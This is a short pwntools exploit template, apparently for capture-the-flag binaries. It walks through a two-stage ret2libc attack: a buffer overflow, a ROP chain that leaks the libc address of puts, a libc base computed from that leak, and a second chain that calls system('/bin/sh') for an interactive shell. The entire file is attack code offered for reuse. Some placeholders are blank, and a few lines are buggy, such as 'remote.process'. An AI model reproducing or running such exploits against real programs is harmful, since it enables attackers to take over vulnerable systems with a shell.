from pwn import *

#Calculate offset manually then enter here

offset = 

#Import binary

elf = ELF("")
p = elf.process()
p = remote.process("ip", port)

#Creating ROP chain of puts leaking puts address

rop = ROP(elf)
rop.call(elf.symbols["puts"], [elf.got["puts"]])
rop.call(elf.symbols[""]) #<--- Return to start of vulnerable function so program doesnt crash

payload = "A"*offset + rop.chain()

#Execution of ROP chain to leak puts address

p.recvuntil("") #<---Receive until vulnerable input
p.sendline(payload)
puts = p.recvuntil("\n")
log.info("Puts leaked: " + u64(puts.rstrip().ljust(8, "\x00")))

#Use online libc database to find libc version (.so)

libc = ELF("")#<---Put downloaded libc here

#Calculate libc address by finding difference of puts

libc.address = puts - libc.symbols["puts"]

#Creating second ROP chain using new addresses

rop2 = ROP(libc)
rop2.call("system", [next(libc.search("/bin/sh\x00"))])
rop2.call("exit")

payload2 = "A"*offset + rop2.chain()

#Execution of second ROP chain to call system(/bin/sh)

p.sendline(payload2)
p.interactive()

#Pwned